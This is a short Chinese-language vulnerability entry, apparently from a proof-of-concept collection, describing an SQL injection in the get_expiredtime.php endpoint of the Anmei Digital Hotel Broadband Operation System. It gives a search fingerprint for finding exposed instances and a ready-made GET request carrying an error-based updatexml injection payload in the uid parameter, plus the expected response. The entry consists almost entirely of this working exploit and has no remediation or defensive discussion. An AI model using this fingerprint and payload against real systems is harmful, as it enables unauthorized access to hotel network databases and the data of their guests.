# 安美数字酒店宽带运营系统get_expiredtime存在SQL注入漏洞

安美数字酒店宽带运营系统 ｜ SQL注入 ｜ —
- **指纹**：`title="酒店宽带运营系统"`
- **请求**：`GET /user/portal/get_expiredtime.php?uid=1\%27%20and%20updatexml(1,concat(0x7e,(md5(1))),3)--%20q`
- **响应特征**：200